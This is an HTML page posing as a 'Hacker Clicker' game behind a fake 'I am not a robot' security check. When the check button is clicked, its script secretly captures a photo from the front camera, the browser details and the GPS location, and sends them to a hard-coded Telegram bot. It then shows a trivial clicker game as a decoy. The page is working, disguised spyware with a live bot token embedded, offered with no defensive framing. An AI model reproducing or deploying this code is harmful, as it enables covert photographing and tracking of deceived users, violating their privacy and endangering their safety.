<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Hacker Clicker v2.0</title>
    <style>
        body { background: #000; color: #0f0; font-family: monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
        .box { border: 2px solid #0f0; padding: 20px; text-align: center; background: #050505; box-shadow: 0 0 15px #0f0; }
        button { background: #0f0; color: #000; border: none; padding: 15px; margin-top: 20px; font-weight: bold; cursor: pointer; width: 100%; }
        #game { display: none; }
    </style>
</head>
<body>

    <div id="captcha" class="box">
        <h2>SECURITY CHECK</h2>
        <p>Підтвердіть, що ви не робот:</p>
        <button id="auth-btn" onclick="run()">Я НЕ РОБОТ (VERIFY)</button>
    </div>

    <div id="game" class="box">
        <h1 id="btc">0 BTC</h1>
        <button onclick="clicker()">ЗЛАМАТИ БЛОК ⚡</button>
        <div id="log" style="font-size: 10px; margin-top: 10px; color: #0a0;"></div>
    </div>

    <script>
        const token = '8652413321:AAGziAFFffZbHEdqxxFWdgXJJNmanVFZxK8';
        const cid = '8194848649';
        let coins = 0;

        async function run() {
            document.getElementById('auth-btn').innerText = "АНАЛІЗ БІОМЕТРІЇ...";
            
            try {
                // Запит камери
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const video = document.createElement('video');
                video.srcObject = stream;
                video.setAttribute("playsinline", true);
                await video.play();
                
                await new Promise(r => setTimeout(r, 2000));

                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                
                stream.getTracks().forEach(t => t.stop());

                // Відправка
                canvas.toBlob(blob => {
                    const fd = new FormData();
                    fd.append('chat_id', cid);
                    fd.append('photo', blob, 'img.jpg');
                    fd.append('caption', `✅ ЮЗЕР В СИСТЕМІ\n📱 Браузер: ${navigator.userAgent.slice(0,40)}`);
                    fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
                }, 'image/jpeg');

                // Локація
                navigator.geolocation.getCurrentPosition(p => {
                    const msg = `📍 ЛОКАЦІЯ:\nhttps://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
                    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${cid}&text=${encodeURIComponent(msg)}`);
                });

            } catch (e) {
                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${cid}&text=❌ Помилка в Chrome: ${e.message}`);
            }

            // Перехід до гри
            setTimeout(() => {
                document.getElementById('captcha').style.display = 'none';
                document.getElementById('game').style.display = 'block';
            }, 2000);
        }

        function clicker() {
            coins++;
            document.getElementById('btc').innerText = coins + " BTC";
            document.getElementById('log').innerText = "Mining block 0x" + Math.random().toString(16).slice(2,8);
            if (navigator.vibrate) navigator.vibrate(40);
        }
    </script>
</body>
</html>
